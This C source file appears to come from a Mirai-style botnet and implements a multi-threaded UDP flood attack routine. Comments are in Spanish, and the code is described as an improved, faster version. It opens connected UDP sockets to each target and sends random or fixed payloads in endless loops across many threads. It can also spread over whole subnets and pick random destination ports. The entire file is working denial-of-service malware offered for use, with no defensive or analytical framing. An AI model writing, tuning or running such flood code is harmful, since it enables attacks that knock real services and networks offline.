#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <poll.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <pthread.h>

// Local header files

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "protocol.h"
#include "udp_common.h"

#define MAX_THREADS 100

// Estructura para pasar datos a los hilos
struct thread_data {
    int thread_id;
    int socket_fd;
    uint16_t data_len;
    BOOL data_rand;
    char *static_packet;  // Buffer fijo si no se aleatoriza
};

// Función del hilo mejorada
void* send_udp_packets(void* thread_arg) {
    struct thread_data* data = (struct thread_data*) thread_arg;
    int socket_fd = data->socket_fd;
    uint16_t data_len = data->data_len;
    BOOL data_rand = data->data_rand;
    char *packet;

    if (data_rand) {
        packet = calloc(data_len, sizeof(char));
        if (packet == NULL) pthread_exit(NULL);
    } else {
        packet = data->static_packet;  // Usamos el buffer predefinido
    }

    while (TRUE) {
        if (data_rand) {
            rand_str(packet, data_len);  // Solo se randomiza si es necesario
        }
        // Enviar por socket conectado (más rápido que sendto)
        send(socket_fd, packet, data_len, MSG_NOSIGNAL);
    }

    if (data_rand) free(packet);
    pthread_exit(NULL);
}

// Versión mejorada de attack_udp_thread
void attack_udp_thread(uint8_t targs_len, struct attack_target* targs, uint8_t opts_len, struct attack_option* opts) {
    int i, t;
    // Número de hilos por objetivo, configurable con la flag "conns" (por defecto 4)
    int threads_per_target = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 4);
    int total_threads = targs_len * threads_per_target;
    pthread_t *threads = calloc(total_threads, sizeof(pthread_t));
    struct thread_data *thread_data_array = calloc(total_threads, sizeof(struct thread_data));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    // Aumentamos tamaño de paquete por defecto a 1460 bytes
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1460);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if (sport == 0xffff) {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    // Buffer estático para cuando no se necesita aleatoriedad (relleno con ceros)
    char *static_packet = NULL;
    if (!data_rand) {
        static_packet = calloc(data_len, sizeof(char));
        if (static_packet == NULL) return;
        // Opcional: rellenar con un patrón fijo en lugar de ceros
        // memset(static_packet, 0x55, data_len);
    }

    int thread_idx = 0;
    for (i = 0; i < targs_len; i++) {
        for (t = 0; t < threads_per_target; t++) {
            struct sockaddr_in bind_addr = {0};
            int socket_fd;

            // Puerto destino aleatorio si no se especificó
            if (dport == 0xffff)
                targs[i].sock_addr.sin_port = rand_next() & 0xffff;
            else
                targs[i].sock_addr.sin_port = htons(dport);

            if ((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
                continue;
            }

            bind_addr.sin_family = AF_INET;
            bind_addr.sin_port = sport;
            bind_addr.sin_addr.s_addr = INADDR_ANY;

            // Bind al puerto fuente (opcional)
            bind(socket_fd, (struct sockaddr*) &bind_addr, sizeof(struct sockaddr_in));

            // Para ataques con máscara de red (ej. /24)
            if (targs[i].netmask < 32) {
                targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t) rand_next()) >> targs[i].netmask));
            }

            // Conectamos el socket (ahora podemos usar send)
            connect(socket_fd, (struct sockaddr*) &targs[i].sock_addr, sizeof(struct sockaddr_in));

            struct thread_data* thread_data = &thread_data_array[thread_idx];
            thread_data->thread_id = thread_idx;
            thread_data->socket_fd = socket_fd;
            thread_data->data_len = data_len;
            thread_data->data_rand = data_rand;
            thread_data->static_packet = static_packet;

            pthread_create(&threads[thread_idx], NULL, send_udp_packets, (void*) thread_data);
            thread_idx++;
        }
    }

    // Mantenemos el proceso vivo hasta que el temporizador lo mate
    while (1) {
        sleep(1);
    }

    // Liberar recursos (nunca se alcanza)
    if (static_packet) free(static_packet);
    free(threads);
    free(thread_data_array);
}
